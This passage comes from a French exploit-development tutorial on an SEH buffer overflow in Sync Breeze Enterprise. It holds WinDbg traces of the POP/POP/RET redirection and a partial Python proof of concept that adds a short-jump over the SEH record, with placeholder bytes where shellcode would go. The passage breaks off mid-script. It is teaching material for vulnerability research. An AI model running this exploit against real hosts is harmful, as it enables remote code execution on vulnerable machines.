<a id="__codelineno-44-17" name="__codelineno-44-17" href="#__codelineno-44-17"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x40\x00\x00</span><span class="s2">&quot;</span>
<a id="__codelineno-44-18" name="__codelineno-44-18" href="#__codelineno-44-18"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-44-19" name="__codelineno-44-19" href="#__codelineno-44-19"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-44-20" name="__codelineno-44-20" href="#__codelineno-44-20"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
<a id="__codelineno-44-21" name="__codelineno-44-21" href="#__codelineno-44-21"></a>
<a id="__codelineno-44-22" name="__codelineno-44-22" href="#__codelineno-44-22"></a>  <span class="n">buf</span> <span class="o">=</span> <span class="n">header</span> <span class="o">+</span> <span class="n">inputBuffer</span>
<a id="__codelineno-44-23" name="__codelineno-44-23" href="#__codelineno-44-23"></a>  <span class="p">[</span><span class="o">...</span><span class="p">]</span>
</code></pre></div>
<p>WinDbg suite à l'exécution de l'exploit :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="c">#</span>
<a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="n">0</span><span class="p">:</span><span class="n">010</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="p">(</span><span class="n">418</span><span class="p">.</span><span class="n">e08</span><span class="p">):</span> <span class="n">Invalid</span> <span class="n">lock</span> <span class="n">sequence</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c000001e</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="n">and</span> <span class="n">handled</span><span class="p">.</span>
<a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01aaf540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f4</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="n">eip</span><span class="p">=</span><span class="n">01aaff58</span> <span class="n">esp</span><span class="p">=</span><span class="n">01aaf444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01aaf458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010202</span>
<a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a><span class="n">01aaff58</span> <span class="n">f0a215104343</span>    <span class="n">lock</span> <span class="n">mov</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="n">ds</span><span class="p">:[</span><span class="n">43431015h</span><span class="p">],</span><span class="n">al</span> <span class="n">ds</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">43431015</span><span class="p">=??</span>
<a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="c">#</span>
<a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a><span class="n">0</span><span class="p">:</span><span class="n">010</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">exchain</span>
<a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a><span class="n">01aaf44c</span><span class="p">:</span> <span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">44</span> <span class="p">(</span><span class="n">77853b20</span><span class="p">)</span>
<a id="__codelineno-45-13" name="__codelineno-45-13" href="#__codelineno-45-13"></a><span class="n">01aafe1c</span><span class="p">:</span> <span class="n">libpal</span><span class="p">!</span><span class="n">md5_starts</span><span class="p">+</span><span class="n">149fb</span> <span class="p">(</span><span class="n">009edf5b</span><span class="p">)</span>
<a id="__codelineno-45-14" name="__codelineno-45-14" href="#__codelineno-45-14"></a><span class="n">01aaff54</span><span class="p">:</span> <span class="p">***</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Sync</span> <span class="n">Breeze</span> <span class="n">Enterprise</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">libspp</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-45-15" name="__codelineno-45-15" href="#__codelineno-45-15"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">16460</span> <span class="p">(</span><span class="n">1015a2f0</span><span class="p">)</span>
<a id="__codelineno-45-16" name="__codelineno-45-16" href="#__codelineno-45-16"></a><span class="n">Invalid</span> <span class="n">exception</span> <span class="n">stack</span> <span class="n">at</span> <span class="n">41414141</span>
<a id="__codelineno-45-17" name="__codelineno-45-17" href="#__codelineno-45-17"></a><span class="c">#</span>
<a id="__codelineno-45-18" name="__codelineno-45-18" href="#__codelineno-45-18"></a><span class="n">0</span><span class="p">:</span><span class="n">010</span><span class="p">&gt;</span> <span class="n">u</span> <span class="n">1015a2f0</span> <span class="n">L3</span>
<a id="__codelineno-45-19" name="__codelineno-45-19" href="#__codelineno-45-19"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16460</span><span class="p">:</span>
<a id="__codelineno-45-20" name="__codelineno-45-20" href="#__codelineno-45-20"></a><span class="n">1015a2f0</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-45-21" name="__codelineno-45-21" href="#__codelineno-45-21"></a><span class="n">1015a2f1</span> <span class="n">5b</span>              <span class="n">pop</span>     <span class="n">ebx</span>
<a id="__codelineno-45-22" name="__codelineno-45-22" href="#__codelineno-45-22"></a><span class="n">1015a2f2</span> <span class="n">c3</span>              <span class="n">ret</span>
</code></pre></div>
<p>On retrouve bien l'adresse des instructions P/P/R via la commande <code>!exchain</code> : <code>libspp!pcre_exec+16460 (1015a2f0)</code>. En désassemblant le contenu de l'adresse <code>1015a2f0</code> on retrouve bien les instructions P/P/R.</p>
<p>On positionne un point d'arrêt sur l'adresse de la séquence P/P/R puis on relance l'exécution :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c">#</span>
<a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">0x1015a2f0</span>
</code></pre></div>
<p>Point d'arrêt atteint, <code>EIP</code> contient bien l'adresse pointant vers la séquence P/P/R :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="c">#</span>
<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="n">Breakpoint</span> <span class="n">0</span> <span class="n">hit</span>
<a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">esp</span><span class="p">=</span><span class="n">01a4ef00</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01a4ef20</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16460</span><span class="p">:</span>
<a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a><span class="n">1015a2f0</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
</code></pre></div>
<p>On déroule étape par étape :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="c">#</span>
<a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="nb">r</span>
<a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">esp</span><span class="p">=</span><span class="n">01a4ef00</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01a4ef20</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16460</span><span class="p">:</span>
<a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="n">1015a2f0</span> <span class="n">58</span>              <span class="n">pop</span>     <span class="n">eax</span>
<a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a><span class="c">#</span>
<a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f1</span> <span class="n">esp</span><span class="p">=</span><span class="n">01a4ef04</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01a4ef20</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-48-13" name="__codelineno-48-13" href="#__codelineno-48-13"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16461</span><span class="p">:</span>
<a id="__codelineno-48-14" name="__codelineno-48-14" href="#__codelineno-48-14"></a><span class="n">1015a2f1</span> <span class="n">5b</span>              <span class="n">pop</span>     <span class="n">ebx</span>
<a id="__codelineno-48-15" name="__codelineno-48-15" href="#__codelineno-48-15"></a><span class="c">#</span>
<a id="__codelineno-48-16" name="__codelineno-48-16" href="#__codelineno-48-16"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-48-17" name="__codelineno-48-17" href="#__codelineno-48-17"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01a4f008</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-48-18" name="__codelineno-48-18" href="#__codelineno-48-18"></a><span class="n">eip</span><span class="p">=</span><span class="n">1015a2f2</span> <span class="n">esp</span><span class="p">=</span><span class="n">01a4ef08</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01a4ef20</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-48-19" name="__codelineno-48-19" href="#__codelineno-48-19"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-48-20" name="__codelineno-48-20" href="#__codelineno-48-20"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16462</span><span class="p">:</span>
<a id="__codelineno-48-21" name="__codelineno-48-21" href="#__codelineno-48-21"></a><span class="n">1015a2f2</span> <span class="n">c3</span>              <span class="n">ret</span>
</code></pre></div>
<p>On a bien été capable de rediriger le flot. Le flot suit l'adresse indiquée via <code>exchain</code> qui est l'adresse ou commence notre séquence P/P/R.</p>
<p>On déréférence le registre de pile (<code>ESP</code>) :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="n">0</span><span class="p">:</span><span class="n">008</span><span class="p">&gt;</span> <span class="n">dd</span> <span class="n">poi</span><span class="p">(</span><span class="n">esp</span><span class="p">)</span> <span class="n">L8</span>
<a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="n">018fff54</span>  <span class="n">41414141</span> <span class="n">1015a2f0</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="n">018fff64</span>  <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>
<a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="n">0</span><span class="p">:</span><span class="n">008</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a><span class="n">eax</span><span class="p">=</span><span class="n">77383b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">018ff540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77383b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="n">eip</span><span class="p">=</span><span class="n">018fff54</span> <span class="n">esp</span><span class="p">=</span><span class="n">018ff444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">018ff458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a><span class="n">018fff54</span> <span class="n">41</span>              <span class="n">inc</span>     <span class="n">ecx</span>
</code></pre></div>
<p>Après l'exécution de <code>RET</code> on retourne sur la pile au sein de notre <em>payload</em> juste avant l'adresse de notre <em>_except_handler</em> (<code>exchain</code>).</p>
<p>Ceci est dû au fait que le paramètre <code>EstablisherFrame</code> pointe sur le début de la structure <code>_EXCEPTION_REGISTRATION_RECORD</code> qui a pour premier élément le membre <code>Next</code> suivi par <code>_except_handler</code>.</p>
<h3 id="island-hopping">Island-Hopping</h3>
<p>Comme indiqué précédemment, la structure <code>EXCEPTION_REGISTRATION_RECORD</code> commence avec le membre <code>Next</code>. Une fois que l'exécution est redirigée vers ce membre sur la pile via la séquence P/P/R le CPU va exécuter les instructions assembleur générées via la <em>opcodes</em> de l'adresse mémoire contenant la séquence P/P/R.</p>
<p>Les octets qui composent l'adresse des instructions P/P/R sont traduits en une instruction <code>lock mov byte ptr ds:[43431015h],al</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">u</span> <span class="n">eip</span> <span class="n">L8</span>
<a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="n">01f2ff54</span> <span class="n">41</span>              <span class="n">inc</span>     <span class="n">ecx</span>
<a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="n">01f2ff55</span> <span class="n">41</span>              <span class="n">inc</span>     <span class="n">ecx</span>
<a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="n">01f2ff56</span> <span class="n">41</span>              <span class="n">inc</span>     <span class="n">ecx</span>
<a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="n">01f2ff57</span> <span class="n">41</span>              <span class="n">inc</span>     <span class="n">ecx</span>
<a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a><span class="n">01f2ff58</span> <span class="n">f0a215104343</span>    <span class="n">lock</span> <span class="n">mov</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="n">ds</span><span class="p">:[</span><span class="n">43431015h</span><span class="p">],</span><span class="n">al</span>  <span class="c">#</span>
<a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="n">01f2ff5e</span> <span class="n">43</span>              <span class="n">inc</span>     <span class="n">ebx</span>
<a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a><span class="n">01f2ff5f</span> <span class="n">43</span>              <span class="n">inc</span>     <span class="n">ebx</span>
<a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a><span class="n">01f2ff60</span> <span class="n">43</span>              <span class="n">inc</span>     <span class="n">ebx</span>
<a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a><span class="c">#</span>
<a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">dd</span> <span class="n">0x43431015</span> <span class="n">L4</span>                       <span class="c"># Adresse pas mappée</span>
<a id="__codelineno-50-12" name="__codelineno-50-12" href="#__codelineno-50-12"></a><span class="n">43431015</span>  <span class="p">????????</span> <span class="p">????????</span> <span class="p">????????</span> <span class="p">????????</span>
</code></pre></div>
<p>Cette instruction va écrire le registre <code>al</code> dans <code>0x43431015</code>. Ce n'est pas une adresse mappée donc il va y avoir un <em>access violation</em>.</p>
<p>On peut contourner ça en utilisant les 4er bytes de la structure <code>Next</code> SEH pour créer une instruction qui va sauter (<em>jump</em>) par-dessus et rediriger vers un shellcode après l'adresse P/P/R.</p>
<p>En assembleur, les <em>short jump</em> sont aussi appelés <em>relative jump</em>. Le premier <em>opcode</em> d'un <em>short jump</em> est toujours <code>0XEB</code> et le second <em>opcode</em> est l'<em>offset</em> relatif en avant ou en arrière.</p>
<p>Le jump relatif est de <code>06</code> <em>bytes</em> plutôt que 4, qui est la taille de l'adresse P/P/R, car l'offset est calculé à partir de l'adresse suivant le <em>jump</em>.</p>
<p>On modifie la preuve de concept en ajoutant <code>06eb</code> correspondant au <em>short jump</em> suivis de deux instructions <code>NOP</code> représentées par les <em>opcode</em> <code>9090</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a>
<a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">9121</span>
<a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
<a id="__codelineno-51-10" name="__codelineno-51-10" href="#__codelineno-51-10"></a>
<a id="__codelineno-51-11" name="__codelineno-51-11" href="#__codelineno-51-11"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">124</span>                        <span class="c1"># On baisse de 4 la taille (de 128 a 124)</span>
<a id="__codelineno-51-12" name="__codelineno-51-12" href="#__codelineno-51-12"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,(</span><span class="mh">0x06eb9090</span><span class="p">))</span>             <span class="c1"># Next Structure Exception Handler</span>
<a id="__codelineno-51-13" name="__codelineno-51-13" href="#__codelineno-51-13"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x1015a2f0</span><span class="p">))</span>            <span class="c1"># P/P/R (EIP)</span>
<a id="__codelineno-51-14" name="__codelineno-51-14" href="#__codelineno-51-14"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x43</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span> <span class="c1"># Payload</span>
<a id="__codelineno-51-15" name="__codelineno-51-15" href="#__codelineno-51-15"></a>
<a id="__codelineno-51-16" name="__codelineno-51-16" href="#__codelineno-51-16"></a>  <span class="n">header</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x75\x19\xba\xab</span><span class="s2">&quot;</span>
<a id="__codelineno-51-17" name="__codelineno-51-17" href="#__codelineno-51-17"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x03\x00\x00\x00</span><span class="s2">&quot;</span>
<a id="__codelineno-51-18" name="__codelineno-51-18" href="#__codelineno-51-18"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00\x40\x00\x00</span><span class="s2">&quot;</span>
<a id="__codelineno-51-19" name="__codelineno-51-19" href="#__codelineno-51-19"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-51-20" name="__codelineno-51-20" href="#__codelineno-51-20"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">))</span>
<a id="__codelineno-51-21" name="__codelineno-51-21" href="#__codelineno-51-21"></a>  <span class="n">header</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
<a id="__codelineno-51-22" name="__codelineno-51-22" href="#__codelineno-51-22"></a>
